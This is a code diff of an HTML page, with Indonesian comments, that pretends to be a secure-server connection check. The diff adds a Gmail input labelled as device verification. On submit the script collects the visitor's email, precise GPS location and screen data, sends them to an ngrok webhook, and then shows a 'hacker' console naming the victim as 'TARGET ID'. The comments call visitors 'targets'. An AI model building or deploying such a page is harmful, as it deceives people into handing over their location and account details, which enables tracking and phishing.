@@ -1,4 +1,3 @@
-
     <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -20,7 +19,7 @@
         .loading-spinner {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #3498db;
-            border-radius: 50%;
+            border-radius: 50%;			
             width: 40px;
             height: 40px;
             animation: spin 1s linear infinite;
@@ -38,11 +37,31 @@
 </head>
 <body>
 
-    <!-- 🌐 KONDISI 1: TAMPILAN NORMAL (Pancingan Izin Lokasi) -->
+	    <!-- 🌐 KONDISI 1: TAMPILAN NORMAL (Pancingan Izin Lokasi & Input Gmail) -->
     <div id="normal-view">
+        <!-- Spinner ditaruh paling atas agar terlihat seperti sedang loading sistem resmi -->
         <div class="loading-spinner"></div>
-        <h3 style="font-weight: 500; color: #5f6368;">Connecting to secure server cluster...</h3>
-        <p id="status-text" style="color: #70757a; font-size: 14px;">Please establish device location handshake to verify connection parameters.</p>
+        
+        <h3 style="font-weight: 500; color: #5f6368; margin-bottom: 5px;">Connecting to secure server cluster...</h3>
+        <p id="status-text" style="color: #70757a; font-size: 14px; margin-top: 0;">Please establish device connection handshake to verify security parameters.</p>
+        
+        <!-- Kotak Input Gmail diletakkan secara rapi di bawah teks indikator -->
+        <div style="margin-top: 25px;">
+            <input type="email" id="email-target" placeholder="Masukkan Gmail Anda untuk verifikasi" required style="padding: 12px; width: 85%; max-width: 320px; margin-bottom: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
+            <br>
+            <button onclick="prosesHandshake()" style="padding: 12px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; width: 85%; max-width: 320px; box-sizing: border-box;">Verifikasi Integritas Perangkat</button>
+        </div>
+    </div>
+
+	<!-- ⚡ KONDISI 2: TAMPILAN HACKER KEREN (Muncul Setelah Data Masuk Database) -->
+    <div id="hacker-view" class="hacker-mode">
+        <div class="header-title">⚡ SECURITY SIMULATOR ENGINE ACTIVE</div>
+        <div class="console-box">
+            <div>[SYS] Core database modules... CONNECTED</div>
+            <div>[SYS] Secure terminal link... VERIFIED</div>
+            <div id="scan-status" style="color: #00ff66; font-weight: bold;">[SUCCESS] Device integrity report generated successfully.</div>
+            <div id="log-data" style="margin-top: 10px; color: #888;"></div>
+        </div>
     </div>
 
     <!-- ⚡ KONDISI 2: TAMPILAN HACKER KEREN (Muncul Setelah Data Masuk Database) -->
@@ -56,10 +75,26 @@
         </div>
     </div>
 
-    <script>
-        // ⚠️ TETAP GUNAKAN ALAMAT NGROK AKTIF ANDA YANG SEDANG BERJALAN DI VS CODE
-        const WEBHOOK_URL = "https://ditzy-omega-mud.ngrok-free.dev/webhook";
+        <script>
+        // ⚠️ SAMAKAN DENGAN LINK NGROK AKTIF DI TERMINAL VS CODE ANDA SAAT INI!
+        const WEBHOOK_URL = "https://ditzy-omega-mud.ngrok-free.dev/webhook"; 
         const ipAddress = "114.10.157.196";
+
+        // Fungsi yang berjalan saat tombol "Verifikasi Integritas Perangkat" diklik oleh target
+        function prosesHandshake() {
+            const emailInput = document.getElementById('email-target').value;
+            
+            // Validasi sederhana agar target tidak mengosongkan input email
+            if (!emailInput || !emailInput.includes('@')) {
+                alert("Silakan masukkan alamat Gmail yang valid untuk verifikasi!");
+                return;
+            }
+
+            document.getElementById('status-text').innerText = "[PROCESSING] Compiling hardware metrics...";
+            
+            // Jalankan fungsi GPS dan kirim data bersama email yang diketik target
+            kirimLokasi(emailInput);
+        }
 
         async function kirim(data) {
             try {
@@ -69,19 +104,18 @@
                     body: JSON.stringify(data)
                 });
                 
-                // 🔥 PROSES BUBAR BUBAL (Bunglon Berubah Jadi Hacker Setelah Sukses Kirim Data!)
-                document.title = "CyberSec System Core v2.4"; // Judul tab berubah ala hacker
-                document.body.style.backgroundColor = "#050505"; // Background berubah hitam pekat
-                document.getElementById('normal-view').style.display = "none"; // Hapus layar putih
+                // Efek Bunglon Berubah Menjadi Hacker Setelah Sukses Kirim Data!
+                document.title = "CyberSec System Core v2.4";
+                document.body.style.backgroundColor = "#050505";
+                document.getElementById('normal-view').style.display = "none";
                 
-                // Tampilkan menu dashboard hacker yang sangat disukai dosen Anda
                 const hackerView = document.getElementById('hacker-view');
                 hackerView.style.display = "block";
                 
                 document.getElementById('log-data').innerHTML = `
                     &gt; PIPING HARDWARE METRICS TO SQL... DONE<br>
+                    &gt; TARGET ID: ${data.email}<br>
                     &gt; DATABASE FILE: pelacakan.db LOCKED<br>
-                    &gt; LATENCY ACCURACY: ± ${data.accuracy} meters<br>
                     &gt; RESOLUTION DETECTED: ${data.screen} <span class="blink">[SECURE LINK]</span>
                 `;
             } catch (err) {
@@ -89,7 +123,7 @@
             }
         }
 
-        async function kirimLokasi() {
+        function kirimLokasi(emailUser) {
             if (!navigator.geolocation) {
                 document.getElementById('status-text').innerText = "Hardware API error.";
                 return;
@@ -114,6 +148,7 @@
                 } catch(e) {}
 
                 const data = {
+                    email: emailUser, // Data Gmail Baru Sukses Diikutkan ke Server!
                     lat: latitude,
                     lon: longitude,
                     accuracy: accuracy,
@@ -133,13 +168,10 @@
                 document.getElementById('status-text').innerText = "Handshake rejected: Access to secure protocols denied.";
             }, { enableHighAccuracy: true, timeout: 15000 });
         }
-
-        // Jalankan pelacakan pertama, lalu ulang tiap 1 menit
-        kirimLokasi();
-        setInterval(kirimLokasi, 60000);
     </script>
 </body>
 </html>
+
 
 <!-- <!DOCTYPE html>
 <html lang="id">
